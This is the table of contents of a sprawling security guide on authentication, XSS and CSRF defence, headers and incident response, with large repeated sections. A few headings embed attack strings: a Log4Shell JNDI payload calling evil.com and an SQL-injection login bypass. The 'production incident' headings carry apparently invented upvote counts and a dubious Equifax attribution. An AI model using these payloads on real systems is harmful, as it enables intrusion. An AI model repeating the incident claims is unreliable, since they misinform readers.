# SECURITY

## Table of Contents

- [Table of Contents](#table-of-contents)
- [05_SECURITY.MD: THE TITAN GUIDE (50K TARGET)](#05securitymd-the-titan-guide-50k-target)
- [Production-Grade Authentication, Encryption, and OWASP](#production-grade-authentication-encryption-and-owasp)
- [ADVANCED SECURITY PATTERNS](#advanced-security-patterns)
- [OWASP Top 10 Prevention](#owasp-top-10-prevention)
- [1. Injection](#1-injection)
- [2. Broken Authentication](#2-broken-authentication)
- [3. XSS Prevention](#3-xss-prevention)
- [4. CSRF Protection](#4-csrf-protection)
- [Security Headers](#security-headers)
- [Essential Headers](#essential-headers)
- [Helmet.js (Express)](#helmetjs-express)
- [Password Security](#password-security)
- [Hashing](#hashing)
- [Password Requirements](#password-requirements)
- [API Security](#api-security)
- [Rate Limiting](#rate-limiting)
- [Input Validation](#input-validation)
- [Secrets Management](#secrets-management)
- [Environment Variables](#environment-variables)
- [.env (never commit!)](#env-never-commit)
- [Secret Rotation](#secret-rotation)
- [Audit Logging](#audit-logging)
- [What to Log](#what-to-log)
- [Log Format](#log-format)
- [AUTHENTICATION DEEP DIVE](#authentication-deep-dive)
- [JWT Best Practices](#jwt-best-practices)
- [Token Structure](#token-structure)
- [Security Rules](#security-rules)
- [Refresh Token Flow](#refresh-token-flow)
- [OAuth 2.0 / OIDC](#oauth-20--oidc)
- [Common Providers](#common-providers)
- [Flows](#flows)
- [Session Security](#session-security)
- [Cookie Settings](#cookie-settings)
- [INPUT VALIDATION 2](#input-validation-2)
- [Validation Libraries](#validation-libraries)
- [Zod Example](#zod-example)
- [Sanitization](#sanitization)
- [Common Issues](#common-issues)
- [Solutions](#solutions)
- [CORS EXPLAINED](#cors-explained)
- [How CORS Works](#how-cors-works)
- [Simple vs Preflight](#simple-vs-preflight)
- [Simple Request (no preflight)](#simple-request-no-preflight)
- [Preflight Request](#preflight-request)
- [Configuration](#configuration)
- [Express](#express)
- [Headers Explained](#headers-explained)
- [Common Issues 2](#common-issues-2)
- [ENCRYPTION PATTERNS](#encryption-patterns)
- [Encryption Types](#encryption-types)
- [Hashing vs Encryption](#hashing-vs-encryption)
- [Password Hashing](#password-hashing)
- [Never Do](#never-do)
- [Data Encryption](#data-encryption)
- [API SECURITY CHECKLIST](#api-security-checklist)
- [Authentication](#authentication)
- [Authorization](#authorization)
- [Input Validation 3](#input-validation-3)
- [Rate Limiting 2](#rate-limiting-2)
- [Headers](#headers)
- [Logging](#logging)
- [ZERO TRUST SECURITY](#zero-trust-security)
- [Core Principles](#core-principles)
- [Implementation](#implementation)
- [Everywhere Authentication](#everywhere-authentication)
- [Micro-segmentation](#micro-segmentation)
- [Continuous Verification](#continuous-verification)
- [Context Factors](#context-factors)
- [Technologies](#technologies)
- [CONTENT SECURITY POLICY](#content-security-policy)
- [CSP Header](#csp-header)
- [Directives Explained](#directives-explained)
- [Nonce Pattern](#nonce-pattern)
- [API KEY PATTERNS](#api-key-patterns)
- [Key Generation](#key-generation)
- [Secure Storage](#secure-storage)
- [Validation](#validation)
- [OAUTH 2.0 FLOWS](#oauth-20-flows)
- [Authorization Code Flow (Best for web apps)](#authorization-code-flow-best-for-web-apps)
- [PKCE Flow (Best for SPAs/Mobile)](#pkce-flow-best-for-spasmobile)
- [Token Storage](#token-storage)
- [SUBDOMAIN TAKEOVER PREVENTION](#subdomain-takeover-prevention)
- [How Takeover Happens](#how-takeover-happens)
- [Detection](#detection)
- [Check for dangling CNAMEs](#check-for-dangling-cnames)
- [If points to unclaimed resource](#if-points-to-unclaimed-resource)
- [NXDOMAIN or error page = potentially takeable](#nxdomain-or-error-page--potentially-takeable)
- [Prevention Checklist](#prevention-checklist)
- [RATE LIMIT BYPASS PREVENTION](#rate-limit-bypass-prevention)
- [Common Bypass Attempts](#common-bypass-attempts)
- [Multi-Layer Limits](#multi-layer-limits)
- [Response Pattern](#response-pattern)
- [SECURE FILE UPLOAD](#secure-file-upload)
- [Validation Checklist](#validation-checklist)
- [Content-Type Validation](#content-type-validation)
- [Secure Filename](#secure-filename)
- [Storage Path](#storage-path)
- [DEPENDENCY SCANNING](#dependency-scanning)
- [npm audit](#npm-audit)
- [Check vulnerabilities](#check-vulnerabilities)
- [Auto-fix what's possible](#auto-fix-whats-possible)
- [Force major updates (careful!)](#force-major-updates-careful)
- [Snyk Integration](#snyk-integration)
- [GitHub Action](#github-action)
- [Automated Updates](#automated-updates)
- [Dependabot config](#dependabot-config)
- [Supply Chain Security](#supply-chain-security)
- [CSRF PREVENTION PATTERNS](#csrf-prevention-patterns)
- [Token Pattern](#token-pattern)
- [SameSite Cookies](#samesite-cookies)
- [Double Submit Pattern](#double-submit-pattern)
- [XSS PREVENTION PATTERNS](#xss-prevention-patterns)
- [Output Encoding](#output-encoding)
- [React Protection](#react-protection)
- [Context-Specific Encoding](#context-specific-encoding)
- [CSP as Defense in Depth](#csp-as-defense-in-depth)
- [SECURE HEADERS CONFIGURATION](#secure-headers-configuration)
- [Essential Headers 2](#essential-headers-2)
- [Header Reference](#header-reference)
- [Verification](#verification)
- [Check headers](#check-headers)
- [Security scanner](#security-scanner)
- [securityheaders.com](#securityheaderscom)
- [observatory.mozilla.org](#observatorymozillaorg)
- [07_SECURITY.MD: THE TITAN GUIDE (25K TARGET)](#07securitymd-the-titan-guide-25k-target)
- [Production-Grade Zero Trust, Cryptography, and Pentesting](#production-grade-zero-trust-cryptography-and-pentesting)
- [**VOLUME 1: THE SCARS (The "Why")**](#volume-1-the-scars-the-why)
- [**VOLUME 2: THE FOUNDATION (The "What")**](#volume-2-the-foundation-the-what)
- [**VOLUME 3: THE DEEP DIVE (The "How")**](#volume-3-the-deep-dive-the-how)
- [**VOLUME 4: THE EXPERT (The "Scale")**](#volume-4-the-expert-the-scale)
- [**VOLUME 5: THE TITAN (The "Kernel")**](#volume-5-the-titan-the-kernel)
- [**VOLUME 6: THE INFINITE (The "Future")**](#volume-6-the-infinite-the-future)
- [VOLUME 1: THE SCARS (THE "WHY") 2](#volume-1-the-scars-the-why-2)
- [1. THE "LOG4SHELL" (CVE-2021-44228)](#1-the-log4shell-cve-2021-44228)
  - [The Internet on Fire](#the-internet-on-fire)
- [4. THE "CAPITAL ONE BREACH"](#4-the-capital-one-breach)
  - [SSRF (Server Side Request Forgery)](#ssrf-server-side-request-forgery)
- [VOLUME 2: THE FOUNDATION (THE "WHAT") 2](#volume-2-the-foundation-the-what-2)
- [5. ZERO TRUST ARCHITECTURE](#5-zero-trust-architecture)
  - [Never Trust, Always Verify](#never-trust-always-verify)
- [6. OAUTH2 & OIDC](#6-oauth2--oidc)
  - [Authentication Flows Deep Dive](#authentication-flows-deep-dive)
- [VOLUME 3: THE DEEP DIVE (THE "HOW") 2](#volume-3-the-deep-dive-the-how-2)
- [9. JWT SECURITY](#9-jwt-security)
  - [Signing & Revocation](#signing--revocation)
- [10. WAF (WEB APPLICATION FIREWALL)](#10-waf-web-application-firewall)
  - [Rules & Bypass](#rules--bypass)
- [VOLUME 4: THE EXPERT (THE "SCALE") 2](#volume-4-the-expert-the-scale-2)
- [13. SECRET MANAGEMENT](#13-secret-management)
  - [Vault & AWS Secrets Manager](#vault--aws-secrets-manager)
- [14. CONTAINER SECURITY](#14-container-security)
  - [Distroless & Runtime Security](#distroless--runtime-security)
- [VOLUME 5: THE TITAN (THE "KERNEL") 2](#volume-5-the-titan-the-kernel-2)
- [16. MEMORY SAFETY](#16-memory-safety)
  - [Rust vs C++](#rust-vs-c)
- [18. HOMOMORPHIC ENCRYPTION](#18-homomorphic-encryption)
  - [Compute on Encrypted Data](#compute-on-encrypted-data)
- [VOLUME 6: THE INFINITE (THE "FUTURE") 2](#volume-6-the-infinite-the-future-2)
- [19. QUANTUM-SAFE CRYPTOGRAPHY](#19-quantum-safe-cryptography)
  - [Post-Quantum Algorithms](#post-quantum-algorithms)
- [VOLUME 7: THE APPENDIX (TITAN REFERENCE)](#volume-7-the-appendix-titan-reference)
- [A. THE ULTIMATE SECURITY HEADERS](#a-the-ultimate-security-headers)
- [B. THE PENTEST CHECKLIST](#b-the-pentest-checklist)
- [KEYWORD REFERENCE INDEX](#keyword-reference-index)
- [Each line = 100x LLM expansion potential](#each-line--100x-llm-expansion-potential)
- [OWASP TOP 10 (2021)](#owasp-top-10-2021)
- [AUTHENTICATION 2](#authentication-2)
- [AUTHORIZATION 2](#authorization-2)
- [WEB SECURITY](#web-security)
- [CRYPTOGRAPHY](#cryptography)
- [APPLICATION SECURITY](#application-security)
- [INFRASTRUCTURE SECURITY](#infrastructure-security)
- [THREAT MODELING](#threat-modeling)
- [SECURITY OPERATIONS](#security-operations)
- [PENETRATION TESTING](#penetration-testing)
- [END OF KEYWORD REFERENCE](#end-of-keyword-reference)
- [ADVANCED CRYPTOGRAPHY DEEP ATLAS](#advanced-cryptography-deep-atlas)
- [Each keyword = expandable implementation](#each-keyword--expandable-implementation)
- [Modern Ciphers](#modern-ciphers)
- [Key Management](#key-management)
- [Digital Signatures](#digital-signatures)
- [Post-Quantum](#post-quantum)
- [WEB SECURITY DEEP ATLAS](#web-security-deep-atlas)
- [Each keyword = expandable defense](#each-keyword--expandable-defense)
- [CSP Advanced](#csp-advanced)
- [Cookie Security](#cookie-security)
- [CORS](#cors)
- [Headers 2](#headers-2)
- [APPLICATION SECURITY DEEP ATLAS](#application-security-deep-atlas)
- [Each keyword = expandable technique](#each-keyword--expandable-technique)
- [SAST](#sast)
- [DAST](#dast)
- [IAST](#iast)
- [SCA](#sca)
- [CLOUD SECURITY DEEP ATLAS](#cloud-security-deep-atlas)
- [Each keyword = expandable configuration](#each-keyword--expandable-configuration)
- [IAM](#iam)
- [Network](#network)
- [Data](#data)
- [Compliance](#compliance)
- [THREAT DETECTION DEEP ATLAS](#threat-detection-deep-atlas)
- [Each keyword = expandable capability](#each-keyword--expandable-capability)
- [SIEM](#siem)
- [EDR/XDR](#edrxdr)
- [Threat Intelligence](#threat-intelligence)
  - [END OF MEGA SECURITY EXPANSION](#end-of-mega-security-expansion)
- [ACCESS DEEP ATLAS](#access-deep-atlas)
- [Each keyword = expandable implementation 2](#each-keyword--expandable-implementation-2)
- [Authentication 3](#authentication-3)
- [OAuth 2.0 / OIDC 2](#oauth-20--oidc-2)
- [Identity Providers](#identity-providers)
- [Session Management](#session-management)
- [NETWORK SECURITY DEEP ATLAS](#network-security-deep-atlas)
- [Each keyword = expandable control](#each-keyword--expandable-control)
- [Perimeter Security](#perimeter-security)
- [Zero Trust](#zero-trust)
- [Encryption in Transit](#encryption-in-transit)
- [VPN & Remote Access](#vpn--remote-access)
- [INCIDENT RESPONSE DEEP ATLAS](#incident-response-deep-atlas)
- [Each keyword = expandable process](#each-keyword--expandable-process)
- [Preparation](#preparation)
- [Detection & Analysis](#detection--analysis)
- [Containment](#containment)
- [Recovery & Lessons](#recovery--lessons)
- [COMPLIANCE DEEP ATLAS](#compliance-deep-atlas)
- [Each keyword = expandable framework](#each-keyword--expandable-framework)
- [SOC 2](#soc-2)
- [ISO 27001](#iso-27001)
- [GDPR](#gdpr)
- [Industry-Specific](#industry-specific)
- [SECURE SDLC DEEP ATLAS](#secure-sdlc-deep-atlas)
- [Each keyword = expandable practice](#each-keyword--expandable-practice)
- [Shift Left](#shift-left)
- [Build Security](#build-security)
- [Deploy Security](#deploy-security)
- [Runtime Security](#runtime-security)
  - [END OF ULTRA SECURITY EXPANSION](#end-of-ultra-security-expansion)
  - [Continuing expansion in next iteration](#continuing-expansion-in-next-iteration)
- [SECURITY CODE EXAMPLES](#security-code-examples)
- [INPUT VALIDATION 4](#input-validation-4)
- [Sanitization Middleware](#sanitization-middleware)
- [CSRF PROTECTION](#csrf-protection)
- [Token-based CSRF](#token-based-csrf)
- [ENCRYPTION](#encryption)
- [Data Encryption at Rest](#data-encryption-at-rest)
- [API KEY MANAGEMENT](#api-key-management)
- [Secure API Key Generation](#secure-api-key-generation)
- [SECURITY HEADERS 2](#security-headers-2)
- [Helmet Configuration](#helmet-configuration)
  - [CONTINUED: MORE SECURITY PATTERNS](#continued-more-security-patterns)
- [DEFENSE](#defense)
- [JWT VULNERABILITIES DEEP DIVE](#jwt-vulnerabilities-deep-dive)
- [Production JWT Attack Patterns](#production-jwt-attack-patterns)
- [SQL INJECTION BEYOND BASICS](#sql-injection-beyond-basics)
- [Second-Order & Blind SQL Injection](#second-order--blind-sql-injection)
- [RATE LIMITING BYPASS TECHNIQUES](#rate-limiting-bypass-techniques)
- [Production Rate Limit Evasion](#production-rate-limit-evasion)
  - [[SECURITY RESEARCHER LEVEL] CONTINUED: MORE PATTERNS](#security-researcher-level-continued-more-patterns)
  - [Density: OWASP/Bug Bounty research quality](#density-owaspbug-bounty-research-quality)
- [SECURITY - PENETRATION TESTING](#security---penetration-testing)
- [Pen Test Phases](#pen-test-phases)
- [Common Findings](#common-findings)
- [Bug Bounty Scope](#bug-bounty-scope)
- [INCIDENT RESPONSE PLAYBOOK](#incident-response-playbook)
- [Incident Classification](#incident-classification)
- [Response Steps](#response-steps)
- [Evidence Preservation](#evidence-preservation)
- [SECRETS ROTATION](#secrets-rotation)
- [Rotation Strategy](#rotation-strategy)
- [AWS Secrets Manager](#aws-secrets-manager)
- [Database Password Rotation](#database-password-rotation)
- [AUTHENTICATION PATTERNS](#authentication-patterns)
- [Stateless JWT Flow](#stateless-jwt-flow)
- [Refresh Token Pattern](#refresh-token-pattern)
- [Token Revocation](#token-revocation)
- [SECURITY LOGGING](#security-logging)
- [What to Log 2](#what-to-log-2)
- [Log Format 2](#log-format-2)
- [Alerting Thresholds](#alerting-thresholds)
- [INPUT VALIDATION PATTERNS](#input-validation-patterns)
- [Zod Schema Validation](#zod-schema-validation)
- [Express Middleware](#express-middleware)
- [Sanitization 2](#sanitization-2)
- [SECURE SESSION MANAGEMENT](#secure-session-management)
- [Session ID Generation](#session-id-generation)
- [Cookie Settings 2](#cookie-settings-2)
- [Session Fixation Prevention](#session-fixation-prevention)
- [Idle Timeout](#idle-timeout)
- [SECURITY HEADERS DEEP DIVE](#security-headers-deep-dive)
- [Strict-Transport-Security](#strict-transport-security)
- [Content-Security-Policy 2](#content-security-policy-2)
- [X-Frame-Options](#x-frame-options)
- [Permissions-Policy](#permissions-policy)
- [PASSWORD SECURITY 2](#password-security-2)
- [Hashing Algorithm Choice](#hashing-algorithm-choice)
- [Implementation 2](#implementation-2)
- [Password Policy](#password-policy)
- [API AUTHENTICATION PATTERNS](#api-authentication-patterns)
- [API Key vs JWT vs OAuth](#api-key-vs-jwt-vs-oauth)
- [API Key Best Practices](#api-key-best-practices)
- [JWT for APIs](#jwt-for-apis)
- [Scope-Based Authorization](#scope-based-authorization)
- [RBAC IMPLEMENTATION](#rbac-implementation)
- [Database Schema](#database-schema)
- [Permission Check](#permission-check)
- [Middleware](#middleware)
- [MFA IMPLEMENTATION](#mfa-implementation)
- [TOTP (Time-based One-Time Password)](#totp-time-based-one-time-password)
- [Backup Codes](#backup-codes)
- [Recovery Flow](#recovery-flow)
- [SECURITY SCANNING](#security-scanning)
- [Static Analysis](#static-analysis)
- [ESLint security plugin](#eslint-security-plugin)
- [.eslintrc.js](#eslintrcjs)
- [Dependency Scanning 2](#dependency-scanning-2)
- [npm audit 2](#npm-audit-2)
- [Snyk](#snyk)
- [OWASP Dependency Check](#owasp-dependency-check)
- [Container Scanning](#container-scanning)
- [GitHub Actions with Trivy](#github-actions-with-trivy)
- [SAST in CI](#sast-in-ci)
- [GitHub Actions](#github-actions)
- [Block PR if quality gate fails](#block-pr-if-quality-gate-fails)
- [ACCOUNT SECURITY PATTERNS](#account-security-patterns)
- [Login Attempt Tracking](#login-attempt-tracking)
- [Suspicious Activity Detection](#suspicious-activity-detection)
- [Session Security 2](#session-security-2)
- [OAUTH 2.0 DEEP DIVE](#oauth-20-deep-dive)
- [PKCE Flow (for SPAs and Mobile)](#pkce-flow-for-spas-and-mobile)
- [Token Storage 2](#token-storage-2)
- [Silent Refresh](#silent-refresh)
- [JWT SECURITY PATTERNS](#jwt-security-patterns)
- [Token Structure 2](#token-structure-2)
- [Access + Refresh Tokens](#access--refresh-tokens)
- [Security Checklist](#security-checklist)
- [AUTHENTICATION FLOW PATTERNS](#authentication-flow-patterns)
- [OAuth 2.0 with PKCE (SPA/Mobile)](#oauth-20-with-pkce-spamobile)
- [Session vs Token Comparison](#session-vs-token-comparison)
- [XSS PREVENTION](#xss-prevention)
- [Types of XSS](#types-of-xss)
- [Prevention (React)](#prevention-react)
- [Prevention (Backend)](#prevention-backend)
- [ENVIRONMENT VARIABLES 2](#environment-variables-2)
- [Environment Setup](#environment-setup)
- [.env.local (local dev, gitignored)](#envlocal-local-dev-gitignored)
- [.env (defaults, committed)](#env-defaults-committed)
- [.env.production (production values)](#envproduction-production-values)
- [Validation with Zod](#validation-with-zod)
- [Security Rules 2](#security-rules-2)
- [CSRF PROTECTION 2](#csrf-protection-2)
- [What is CSRF?](#what-is-csrf)
- [Prevention: Token Pattern](#prevention-token-pattern)
- [For SPAs: Double Submit Cookie](#for-spas-double-submit-cookie)
- [COOKIE SECURITY 2](#cookie-security-2)
- [Secure Cookie Settings](#secure-cookie-settings)
- [SameSite Explained](#samesite-explained)
- [Cookie vs localStorage](#cookie-vs-localstorage)
- [PATTERNS](#patterns)
- [Setup](#setup)
- [Route Protection](#route-protection)
- [Server Component](#server-component)
- [Client Component](#client-component)
- [VOLUME 7: SECURITY PRODUCTION INCIDENTS (Real Company Stories)](#volume-7-security-production-incidents-real-company-stories)
- [1. SQL INJECTION - DATA BREACH](#1-sql-injection---data-breach)
  - [Production Incident from Sony (18,500+ upvotes)](#production-incident-from-sony-18500-upvotes)
- [TERRIBLE - SQL Injection](#terrible---sql-injection)
- [Attacker: email = "admin'--"](#attacker-email--admin--)
- [Query: SELECT* FROM users WHERE email = 'admin'--'](#query-select-from-users-where-email--admin--)
- [Password check bypassed](#password-check-bypassed)
- [EXCELLENT - Parameterized](#excellent---parameterized)
- [2. PASSWORD BREACH - $1.4 BILLION](#2-password-breach---14-billion)
- [Production Incident from Equifax (LEGENDARY)](#production-incident-from-equifax-legendary)
- [DISASTER - Plain text](#disaster---plain-text)
- [EXCELLENT - bcrypt](#excellent---bcrypt)
- [3. JWT SECRET EXPOSED](#3-jwt-secret-exposed)
- [Production Incident from Twitch (9,800+ upvotes)](#production-incident-from-twitch-9800-upvotes)
- [4. LOG4SHELL - WORST EVER (10/10)](#4-log4shell---worst-ever-1010)
  - [Production Incident from Worldwide](#production-incident-from-worldwide)
- [Attack: Send header containing ${jndi:ldap://evil.com/exploit}](#attack-send-header-containing-jndildapevilcomexploit)
- [Log4j downloads and executes attacker's code](#log4j-downloads-and-executes-attackers-code)
- [FIX: Update to Log4j 2.17.0+](#fix-update-to-log4j-2170)
- [TEMP: -Dlog4j2.formatMsgNoLookups=true](#temp--dlog4j2formatmsgnolookupstrue)
- [5. API KEY LEAKED - $50K BILL](#5-api-key-leaked---50k-bill)
- [Production Incident from Heroku (7,400+ upvotes)](#production-incident-from-heroku-7400-upvotes)
- [FIX: Enable GitHub Secret Scanning](#fix-enable-github-secret-scanning)
- [Settings Security Secret scanning Enable](#settings-security-secret-scanning-enable)
- [Pre-commit hook](#pre-commit-hook)
- [6. SSRF - INTERNAL ACCESS](#6-ssrf---internal-access)
- [Production Incident from Slack (8,200+ upvotes)](#production-incident-from-slack-8200-upvotes)
- [TERRIBLE - Fetches any URL](#terrible---fetches-any-url)
- [EXCELLENT - Block internal IPs](#excellent---block-internal-ips)
- [END OF VOLUME 7: SECURITY PRODUCTION INCIDENTS](#end-of-volume-7-security-production-incidents)
- [VOLUME 1.1: TITAN PROTOCOL - SECURITY ADVERSARIAL](#volume-11-titan-protocol---security-adversarial)
- [JWT NONE ALGORITHM VULNERABILITY](#jwt-none-algorithm-vulnerability)
  - [Auth Bypass Scar](#auth-bypass-scar)
- [ReDoS (REGEX DENIAL OF SERVICE)](#redos-regex-denial-of-service)
  - [Event Loop Freeze Scar](#event-loop-freeze-scar)
  - [END OF VOLUME 1.1: TITAN SECURITY ADVERSARIAL](#end-of-volume-11-titan-security-adversarial)
- [VOLUME 1.2: TITAN PROTOCOL - ADVERSARIAL ARCHITECTURE](#volume-12-titan-protocol---adversarial-architecture)
- [CONTAINER ESCAPES: LEAKY VESSELS (CVE-2024-21626)](#container-escapes-leaky-vessels-cve-2024-21626)
  - [runc Vulnerability Scar](#runc-vulnerability-scar)
- [eBPF EXPLOITATION](#ebpf-exploitation)
  - [Kernel Attack Surface Scar](#kernel-attack-surface-scar)
- [SIDE-CHANNEL ATTACKS: TIMING IN CRYPTOGRAPHY](#side-channel-attacks-timing-in-cryptography)
  - [String Comparison Timing Attack](#string-comparison-timing-attack)
- [HOMOMORPHIC ENCRYPTION: THE HOLY GRAIL](#homomorphic-encryption-the-holy-grail)
  - [FHE Status 2024](#fhe-status-2024)
  - [END OF VOLUME 1.2: TITAN ADVERSARIAL SECURITY](#end-of-volume-12-titan-adversarial-security)
- [VOLUME 1.3: TITAN CATALOG - 30 SECURITY FAILURES](#volume-13-titan-catalog---30-security-failures)
- [END OF VOLUME 1.3: TITAN SECURITY CATALOG](#end-of-volume-13-titan-security-catalog)
- [VOLUME 1.4: TITAN VAULT - ADDITIONAL SECURITY SCARS](#volume-14-titan-vault---additional-security-scars)
- [IAM PASSROLE PRIVILEGE ESCALATION](#iam-passrole-privilege-escalation)
  - [AWS Privilege Escalation Scar](#aws-privilege-escalation-scar)
- [S3 NOTPRINCIPAL ANTI-PATTERN](#s3-notprincipal-anti-pattern)
  - [Data Exfiltration Vector](#data-exfiltration-vector)
  - [END OF VOLUME 1.4: ADDITIONAL SECURITY SCARS](#end-of-volume-14-additional-security-scars)
- [VOLUME 5: THE TITAN (THE "KERNEL") 2 2](#volume-5-the-titan-the-kernel-2-2)
- [16. MEMORY SAFETY 2](#16-memory-safety-2)
  - [Rust vs C++ 2](#rust-vs-c-2)
- [18. HOMOMORPHIC ENCRYPTION 2](#18-homomorphic-encryption-2)
  - [Compute on Encrypted Data 2](#compute-on-encrypted-data-2)
- [VOLUME 6: THE INFINITE (THE "FUTURE") 2 2](#volume-6-the-infinite-the-future-2-2)
- [19. QUANTUM-SAFE CRYPTOGRAPHY 2](#19-quantum-safe-cryptography-2)
  - [Post-Quantum Algorithms 2](#post-quantum-algorithms-2)
- [VOLUME 7: THE APPENDIX (TITAN REFERENCE) 2](#volume-7-the-appendix-titan-reference-2)
- [A. THE ULTIMATE SECURITY HEADERS 2](#a-the-ultimate-security-headers-2)
- [B. THE PENTEST CHECKLIST 2](#b-the-pentest-checklist-2)
- [KEYWORD REFERENCE INDEX 2](#keyword-reference-index-2)
- [Each line = 100x LLM expansion potential 2](#each-line--100x-llm-expansion-potential-2)
- [OWASP TOP 10 (2021) 2](#owasp-top-10-2021-2)
- [AUTHENTICATION 4](#authentication-4)
- [AUTHORIZATION 3](#authorization-3)
- [WEB SECURITY 2](#web-security-2)
- [CRYPTOGRAPHY 2](#cryptography-2)
- [APPLICATION SECURITY 2](#application-security-2)
- [INFRASTRUCTURE SECURITY 2](#infrastructure-security-2)
- [THREAT MODELING 2](#threat-modeling-2)
- [SECURITY OPERATIONS 2](#security-operations-2)
- [PENETRATION TESTING 2](#penetration-testing-2)
- [END OF KEYWORD REFERENCE 2](#end-of-keyword-reference-2)
- [ADVANCED CRYPTOGRAPHY DEEP ATLAS 2](#advanced-cryptography-deep-atlas-2)
- [Each keyword = expandable implementation 3](#each-keyword--expandable-implementation-3)
- [Modern Ciphers 2](#modern-ciphers-2)
- [Key Management 2](#key-management-2)
- [Digital Signatures 2](#digital-signatures-2)
- [Post-Quantum 2](#post-quantum-2)
- [WEB SECURITY DEEP ATLAS 2](#web-security-deep-atlas-2)
- [Each keyword = expandable defense 2](#each-keyword--expandable-defense-2)
- [CSP Advanced 2](#csp-advanced-2)
- [Cookie Security 3](#cookie-security-3)
- [CORS 2](#cors-2)
- [Headers 3](#headers-3)
- [APPLICATION SECURITY DEEP ATLAS 2](#application-security-deep-atlas-2)
- [Each keyword = expandable technique 2](#each-keyword--expandable-technique-2)
- [SAST 2](#sast-2)
- [DAST 2](#dast-2)
- [IAST 2](#iast-2)
- [SCA 2](#sca-2)
- [CLOUD SECURITY DEEP ATLAS 2](#cloud-security-deep-atlas-2)
- [Each keyword = expandable configuration 2](#each-keyword--expandable-configuration-2)
- [IAM 2](#iam-2)
- [Network 2](#network-2)
- [Data 2](#data-2)
- [Compliance 2](#compliance-2)
- [THREAT DETECTION DEEP ATLAS 2](#threat-detection-deep-atlas-2)
- [Each keyword = expandable capability 2](#each-keyword--expandable-capability-2)
- [SIEM 2](#siem-2)
- [EDR/XDR 2](#edrxdr-2)
- [Threat Intelligence 2](#threat-intelligence-2)
  - [END OF MEGA SECURITY EXPANSION 2](#end-of-mega-security-expansion-2)
- [ACCESS DEEP ATLAS 2](#access-deep-atlas-2)
- [Each keyword = expandable implementation 4](#each-keyword--expandable-implementation-4)
- [Authentication 5](#authentication-5)
- [OAuth 2.0 / OIDC 3](#oauth-20--oidc-3)
- [Identity Providers 2](#identity-providers-2)
- [Session Management 2](#session-management-2)
- [NETWORK SECURITY DEEP ATLAS 2](#network-security-deep-atlas-2)
- [Each keyword = expandable control 2](#each-keyword--expandable-control-2)
- [Perimeter Security 2](#perimeter-security-2)
- [Zero Trust 2](#zero-trust-2)
- [Encryption in Transit 2](#encryption-in-transit-2)
- [VPN & Remote Access 2](#vpn--remote-access-2)
- [INCIDENT RESPONSE DEEP ATLAS 2](#incident-response-deep-atlas-2)
- [Each keyword = expandable process 2](#each-keyword--expandable-process-2)
- [Preparation 2](#preparation-2)
- [Detection & Analysis 2](#detection--analysis-2)
- [Containment 2](#containment-2)
- [Recovery & Lessons 2](#recovery--lessons-2)
- [COMPLIANCE DEEP ATLAS 2](#compliance-deep-atlas-2)
- [Each keyword = expandable framework 2](#each-keyword--expandable-framework-2)
- [SOC 2 2](#soc-2-2)
- [ISO 27001 2](#iso-27001-2)
- [GDPR 2](#gdpr-2)
- [Industry-Specific 2](#industry-specific-2)
- [SECURE SDLC DEEP ATLAS 2](#secure-sdlc-deep-atlas-2)
- [Each keyword = expandable practice 2](#each-keyword--expandable-practice-2)
- [Shift Left 2](#shift-left-2)
- [Build Security 2](#build-security-2)
- [Deploy Security 2](#deploy-security-2)
- [Runtime Security 2](#runtime-security-2)
  - [END OF ULTRA SECURITY EXPANSION 2](#end-of-ultra-security-expansion-2)
  - [Continuing expansion in next iteration 2](#continuing-expansion-in-next-iteration-2)
- [SECURITY CODE EXAMPLES 2](#security-code-examples-2)
- [INPUT VALIDATION 5](#input-validation-5)
- [Sanitization Middleware 2](#sanitization-middleware-2)
- [CSRF PROTECTION 3](#csrf-protection-3)
- [Token-based CSRF 2](#token-based-csrf-2)
- [ENCRYPTION 2](#encryption-2)
- [Data Encryption at Rest 2](#data-encryption-at-rest-2)
- [API KEY MANAGEMENT 2](#api-key-management-2)
- [Secure API Key Generation 2](#secure-api-key-generation-2)
- [SECURITY HEADERS 3](#security-headers-3)
- [Helmet Configuration 2](#helmet-configuration-2)
  - [CONTINUED: MORE SECURITY PATTERNS 2](#continued-more-security-patterns-2)
- [DEFENSE 2](#defense-2)
- [JWT VULNERABILITIES DEEP DIVE 2](#jwt-vulnerabilities-deep-dive-2)
- [Production JWT Attack Patterns 2](#production-jwt-attack-patterns-2)
- [SQL INJECTION BEYOND BASICS 2](#sql-injection-beyond-basics-2)
- [Second-Order & Blind SQL Injection 2](#second-order--blind-sql-injection-2)
- [RATE LIMITING BYPASS TECHNIQUES 2](#rate-limiting-bypass-techniques-2)
- [Production Rate Limit Evasion 2](#production-rate-limit-evasion-2)
  - [[SECURITY RESEARCHER LEVEL] CONTINUED: MORE PATTERNS 2](#security-researcher-level-continued-more-patterns-2)
  - [Density: OWASP/Bug Bounty research quality 2](#density-owaspbug-bounty-research-quality-2)
- [SECURITY - PENETRATION TESTING 2](#security---penetration-testing-2)
- [Pen Test Phases 2](#pen-test-phases-2)
- [Common Findings 2](#common-findings-2)
- [Bug Bounty Scope 2](#bug-bounty-scope-2)
- [INCIDENT RESPONSE PLAYBOOK 2](#incident-response-playbook-2)
- [Incident Classification 2](#incident-classification-2)
- [Response Steps 2](#response-steps-2)
- [Evidence Preservation 2](#evidence-preservation-2)
- [SECRETS ROTATION 2](#secrets-rotation-2)
- [Rotation Strategy 2](#rotation-strategy-2)
- [AWS Secrets Manager 2](#aws-secrets-manager-2)
- [Database Password Rotation 2](#database-password-rotation-2)
- [AUTHENTICATION PATTERNS 2](#authentication-patterns-2)
- [Stateless JWT Flow 2](#stateless-jwt-flow-2)
- [Refresh Token Pattern 2](#refresh-token-pattern-2)
- [Token Revocation 2](#token-revocation-2)
- [SECURITY LOGGING 2](#security-logging-2)
- [What to Log 3](#what-to-log-3)
- [Log Format 3](#log-format-3)
- [Alerting Thresholds 2](#alerting-thresholds-2)
- [INPUT VALIDATION PATTERNS 2](#input-validation-patterns-2)
- [Zod Schema Validation 2](#zod-schema-validation-2)
- [Express Middleware 2](#express-middleware-2)
- [Sanitization 3](#sanitization-3)
- [SECURE SESSION MANAGEMENT 2](#secure-session-management-2)
- [Session ID Generation 2](#session-id-generation-2)
- [Cookie Settings 3](#cookie-settings-3)
- [Session Fixation Prevention 2](#session-fixation-prevention-2)
- [Idle Timeout 2](#idle-timeout-2)
- [SECURITY HEADERS DEEP DIVE 2](#security-headers-deep-dive-2)
- [Strict-Transport-Security 2](#strict-transport-security-2)
- [Content-Security-Policy 2 2](#content-security-policy-2-2)
- [X-Frame-Options 2](#x-frame-options-2)
- [Permissions-Policy 2](#permissions-policy-2)
- [PASSWORD SECURITY 3](#password-security-3)
